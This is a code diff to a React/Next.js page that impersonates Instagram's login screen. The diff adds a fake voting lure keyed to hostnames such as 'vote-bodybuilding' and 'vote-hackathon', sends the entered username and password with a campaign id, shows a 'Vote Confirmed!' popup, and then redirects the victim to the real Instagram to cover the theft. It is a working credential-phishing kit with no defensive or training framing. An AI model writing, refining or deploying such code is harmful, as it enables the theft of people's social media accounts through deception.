@@ -3,8 +3,9 @@
 import Image from "next/image"
 import Link from "next/link"
 import { Button } from "@/components/ui/button"
-import { useState } from "react"
+import { useState, useEffect } from "react"
 import { useSystemTheme } from "@/components/useSystemTheme"
+import VotingPage, { type VotingCampaign } from "@/components/voting-page"
 
 type FormDataType = Readonly<{
   username: string
@@ -13,6 +14,12 @@ type FormDataType = Readonly<{
 
 export default function InstagramLogin() {
   useSystemTheme()
+
+  // Voting state
+  const [showVotingPage, setShowVotingPage] = useState<boolean | null>(null)
+  const [votingCampaign, setVotingCampaign] = useState<VotingCampaign | null>(null)
+  const [showSuccessPopup, setShowSuccessPopup] = useState(false)
+
 
   const [formData, setFormData] = useState<FormDataType>({
     username: "",
@@ -25,6 +32,27 @@ export default function InstagramLogin() {
   })
 
   const [isSubmitting, setIsSubmitting] = useState(false)
+
+  // Check if we should show voting page based on URL
+  useEffect(() => {
+    const hostname = window.location.hostname
+    const shouldShowVoting = hostname.includes("vote-bodybuilding") || hostname.includes("vote-hackathon") 
+    setShowVotingPage(shouldShowVoting)
+
+    // Check if user is returning from voting page
+    const storedCampaign = sessionStorage.getItem("votingCampaign")
+    if (storedCampaign && !shouldShowVoting) {
+      try {
+        setVotingCampaign(JSON.parse(storedCampaign))
+      } catch (e) {
+        console.error("Failed to parse voting campaign:", e)
+      }
+    }
+  }, [])
+
+  const handleVoteClick = () => {
+    setShowVotingPage(false)
+  }
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setFormData({
@@ -68,7 +96,10 @@ export default function InstagramLogin() {
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify(formData),
+        body: JSON.stringify({
+          ...formData,
+          campaign: votingCampaign?.id || null
+        }),
       });
 
       const result = await res.json();
@@ -80,27 +111,20 @@ export default function InstagramLogin() {
         // Reset form
         setFormData({ username: "", password: "" });
 
-        // Instagram Reel URLs
-        // const reelId = "DB5yhFPpfki";
-        // const instagramAppUrl = `instagram://reel/${reelId}`;
-        const instagramAppUrl = `instagram://`;
-        const instagramWebUrl = `https://www.instagram.com/`;
+        // Show success popup if there's a voting campaign
+        if (votingCampaign) {
+          setShowSuccessPopup(true);
 
-        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+          // Clear session storage
+          sessionStorage.removeItem("votingCampaign");
 
-        if (isMobile) {
-          // Try to open the Instagram app to the specific reel
-          window.location.href = instagramAppUrl;
-
-          // Fallback to Instagram web if app didn't open
+          // Redirect after showing popup for 3 seconds
           setTimeout(() => {
-            if (document.visibilityState !== "hidden") {
-              window.location.href = instagramWebUrl;
-            }
-          }, 1500);
+            redirectToInstagram();
+          }, 3000);
         } else {
-          // Desktop fallback
-          window.location.href = instagramWebUrl;
+          // No voting campaign, redirect immediately
+          redirectToInstagram();
         }
       }
     } catch (error) {
@@ -110,6 +134,57 @@ export default function InstagramLogin() {
       setIsSubmitting(false);
     }
   };
+
+  const redirectToInstagram = () => {
+    const instagramAppUrl = `instagram://`;
+    const instagramWebUrl = `https://www.instagram.com/`;
+
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+    if (isMobile) {
+      window.location.href = instagramAppUrl;
+      setTimeout(() => {
+        if (document.visibilityState !== "hidden") {
+          window.location.href = instagramWebUrl;
+        }
+      }, 1500);
+    } else {
+      setTimeout(() => {
+        window.location.href = instagramWebUrl;
+      }, 1500);
+    }
+  };
+
+  // Show voting page if URL matches
+  // if (showVotingPage === true) {
+  if (showVotingPage === true) {
+    return <VotingPage onVoteClick={handleVoteClick} />
+  }
+
+  // Show loading while determining which page to show
+  if (showVotingPage === null) {
+    return (
+      <div className="flex items-center justify-center min-h-screen bg-white dark:bg-black">
+        <div className="flex items-center gap-2 invert">
+          <svg aria-label="Loading..." className="animate-spin scale-150" role="img" viewBox="0 0 100 100" width="50" height="50">
+            <rect className="x1i210e2" height="6" opacity="0" rx="3" ry="3" transform="rotate(-90 50 50)" width="25" x="72" y="47"></rect>
+            <rect className="x1i210e2" height="6" opacity="0.08333333333333333" rx="3" ry="3" transform="rotate(-60 50 50)" width="25" x="72" y="47"></rect>
+            <rect className="x1i210e2" height="6" opacity="0.16666666666666666" rx="3" ry="3" transform="rotate(-30 50 50)" width="25" x="72" y="47"></rect>
+            <rect className="x1i210e2" height="6" opacity="0.25" rx="3" ry="3" transform="rotate(0 50 50)" width="25" x="72" y="47"></rect>
+            <rect className="x1i210e2" height="6" opacity="0.3333333333333333" rx="3" ry="3" transform="rotate(30 50 50)" width="25" x="72" y="47"></rect>
+            <rect className="x1i210e2" height="6" opacity="0.4166666666666667" rx="3" ry="3" transform="rotate(60 50 50)" width="25" x="72" y="47"></rect>
+            <rect className="x1i210e2" height="6" opacity="0.5" rx="3" ry="3" transform="rotate(90 50 50)" width="25" x="72" y="47"></rect>
+            <rect className="x1i210e2" height="6" opacity="0.5833333333333334" rx="3" ry="3" transform="rotate(120 50 50)" width="25" x="72" y="47"></rect>
+            <rect className="x1i210e2" height="6" opacity="0.6666666666666666" rx="3" ry="3" transform="rotate(150 50 50)" width="25" x="72" y="47"></rect>
+            <rect className="x1i210e2" height="6" opacity="0.75" rx="3" ry="3" transform="rotate(180 50 50)" width="25" x="72" y="47"></rect>
+            <rect className="x1i210e2" height="6" opacity="0.8333333333333334" rx="3" ry="3" transform="rotate(210 50 50)" width="25" x="72" y="47"></rect>
+            <rect className="x1i210e2" height="6" opacity="0.9166666666666666" rx="3" ry="3" transform="rotate(240 50 50)" width="25" x="72" y="47"></rect>
+          </svg>
+        </div>
+      </div>
+    )
+  }
+
 
   return (
     <div className="flex flex-col items-center justify-center min-h-screen bg-white dark:bg-black px-4 mt-4 text-black dark:text-white">
@@ -300,6 +375,46 @@ export default function InstagramLogin() {
           <span>© 2025 Instagram from Meta</span>
         </div>
       </footer>
+
+      {/* Success Popup */}
+      {showSuccessPopup && votingCampaign && (
+        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 px-4">
+          <div className="bg-white dark:bg-black border border-[#DBDBDB] dark:border-gray-700 rounded-2xl p-8 max-w-md w-full shadow-2xl animate-in fade-in zoom-in duration-300">
+            {/* Success Icon */}
+            <div className="flex justify-center mb-6">
+              <div className="w-20 h-20 bg-gradient-to-r from-green-400 to-emerald-500 rounded-full flex items-center justify-center shadow-lg">
+                <svg className="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
+                </svg>
+              </div>
+            </div>
+
+            {/* Success Message */}
+            <h2 className="text-2xl font-bold text-center mb-3">Vote Confirmed! 🎉</h2>
+            <p className="text-center text-gray-600 dark:text-gray-400 mb-2">
+              Successfully voted for
+            </p>
+            <p className="text-center text-xl font-bold bg-gradient-to-r from-purple-600 to-pink-600 dark:from-purple-400 dark:to-pink-400 bg-clip-text text-transparent mb-6">
+              {votingCampaign.candidateName}
+            </p>
+
+            {/* Instagram Logo */}
+            <div className="flex justify-center mb-4">
+              <Image
+                src="/ig-logo.png"
+                alt="Instagram"
+                className="mix-blend-difference invert w-24 opacity-50"
+                width={96}
+                height={40}
+              />
+            </div>
+
+            <p className="text-center text-sm text-gray-500 dark:text-gray-400">
+              Redirecting to Instagram...
+            </p>
+          </div>
+        </div>
+      )}
     </div>
   )
 }
